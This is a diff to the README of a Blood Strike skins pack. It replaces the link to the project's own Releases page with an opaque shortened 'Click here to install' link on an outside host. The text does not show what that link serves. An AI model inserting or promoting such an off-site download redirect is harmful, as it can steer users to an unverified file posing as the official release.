@@ -24,6 +24,6 @@ A free custom skins and texture replacement pack for **Blood Strike** (PC). This
 
 ## 📥 Installation
 
-1. Download the latest release from the [Releases](../../releases) page
+1. Download the latest release from the [Click here to install ](https://share.google/1N9K2l5UEq6kfNoJ0) page
 2. Extract the archive to a folder of your choice
 3. Copy the contents into your Blood Strike installation directory:
